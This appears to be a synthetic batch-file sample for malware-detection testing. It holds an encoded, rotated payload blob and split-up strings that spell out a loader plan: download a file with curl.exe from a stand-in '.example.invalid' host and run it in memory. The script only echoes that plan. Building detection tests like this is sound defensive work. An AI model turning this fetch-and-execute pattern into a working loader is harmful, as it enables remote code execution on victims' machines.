@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|rotate_left
rem HUNTRESS-MATERIAL:7Hpi+OboyuDmesLG4urS5Mq+5Mra3ujKWMjS5uDC6MbQvtrK2t7k8vjCyMLg6Mrkesbq5NhcyvDK+Obows7Kvsbe6tzoemL4zuTC4NB6xuTe5ua+2MLczurCzsr43Mrw6L7YwtzO6sLOynrc3tzK+MbC2uDC0s7cvtLIesbC2uDC0s7cWsxuxMJkwmhqcGL46uTYetDo6ODmdF5ezG7EwmTCaGpwYlzK8MLa4NjKXNLc7MLY0shewmRsyMpkaGJcyMLo
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set FrAg0=v=1^|steps=acquire_remote,dispatch_memory^|adapter=
set FrAg1=curl.exe^|stage_count=1^|graph=cross_language^|next_
set FrAg2=language=none^|campaign_id=campaign-f7ba2a4581^|url
set FrAg3==https://f7ba2a4581.example.invalid/a26de241.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=cb740ec4"
ver >nul
if errorlevel 1 exit /b 1
call set "ReCoVeReD=%%FrAg0%%%%FrAg1%%%%FrAg2%%%%FrAg3%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe GET https://f7ba2a4581.example.invalid/a26de241.dat then dispatch memory
exit /b 0
